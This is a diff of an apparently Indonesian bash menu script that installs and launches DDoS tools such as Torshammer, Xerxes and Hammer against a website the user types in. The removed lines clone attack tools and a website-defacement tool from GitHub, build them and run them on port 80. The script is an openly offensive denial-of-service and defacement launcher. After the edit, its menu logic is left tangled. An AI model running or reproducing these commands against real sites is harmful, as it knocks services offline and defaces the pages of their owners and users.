@@ -17,8 +17,6 @@ echo $purple"[1] DDOS Website Dengan LITEDDOS"
 echo $purple"[2] DDOS Website Dengan Torshammer"
 echo $purple"[3] DDOS Website Dengan Xerxes"
 echo $purple"[4] DDOS Website Dengan Hammer"
-echo $purple"[5] d1"
-echo $purple"[6] d2"
 echo
 echo $green
 read -p "╭─[Pilih Nomer]
@@ -52,49 +50,6 @@ python2 torshammer.py -T -t target
 fi
 
 if [ $bro = 3 ] || [ $bro = 3 ]
-then
-clear
-echo $green"Installing Xerxes DDOS..."
-sleep 1
-apt update && apt upgrade
-apt install git
-apt install clang
-git clone https://github.com/zanyarjamal/xerxes
-mv xerxes $HOME
-cd $HOME/xerxes
-clang xerxes.c -o xerxes
-clear
-read -p "[masukanWebsiteTarget]>" target
-./xerxes target 80
-fi
-
-if [ $bro = 4 ] || [ $bro = 4 ]
-then
-clear
-echo $green" Installing Hammer DDOS.."
-sleep 1
-git clone https://github.com/cyweb/hammer
-mv hammer $HOME
-cd $HOME/hammer
-read -p "Masukan Target:" target
-python2 hammer.py -T -t target
-fi
-
-if [ $bro = 5 ] || [ $bro = 5 ]
-then
-clear
-figlet "Mr.B4J1N64N" | lolcat
-sleep 1 
-apt install git
-apt install bash
-pip2 install bash
-git clone https://github.com/ALX-04/iesDEFACE
-mv iesDEFACE $HOME
-cd $HOME/iesDEFACE
-bash iesDeface.sh
-fi
-
-if [ $bro = 6 ] || [ $bro = 6 ]
 then
 clear
 echo "\033[34;1m"
